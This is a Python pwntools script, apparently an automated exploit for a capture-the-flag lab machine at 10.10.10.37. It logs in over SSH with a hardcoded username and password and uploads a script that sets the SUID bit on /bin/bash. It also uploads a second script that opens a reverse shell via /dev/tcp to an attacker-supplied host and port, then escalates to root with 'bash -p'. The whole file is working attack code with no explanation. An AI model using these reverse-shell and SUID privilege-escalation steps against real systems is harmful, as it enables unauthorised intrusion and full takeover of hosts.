#!/usr/bin/python3

import os
from pwn import * # pip install pwn

# ctrl + c
def ctrl_c(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

username = 'notch'
password = '8YsqfCTnvxAUeduzjNSXe22'

# Create an SUID script file and 
os.system("echo -e '#!/bin/bash\nchmod u+s /bin/bash' > suid_bash.sh")
lhost=str(input("LHOST: ").strip("\n"))
lport=str(input("LPORT: ").strip("\n"))
os.system("echo -e '#!/bin/bash\nbash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1' > revshell.sh")

# Authenticate with SSH and Upload Shell Script which creates an SUID bash file
def foothold():    
    shell = ssh(username, '10.10.10.37', password=password, port=22)
    shell.upload(b"./suid_bash.sh", remote="/dev/shm/suid_bash.sh")
    shell.upload(b"./revshell.sh", remote="/dev/shm/revshell.sh")
    terminal = shell.run(b"bash")
    terminal.sendline(b"bash /dev/shm/revshell.sh")
try:
    threading.Thread(target=foothold, args=()).start()
except Exception as e:
    log.error(str(e))
shell = listen(lport, timeout=150).wait_for_connection()
if shell.sock is None:
    sys.exit(1)
else:
    # Execute Bash with the SUID bit to escalate privileges
    shell.sendline(b"bash -p")
    shell.interactive()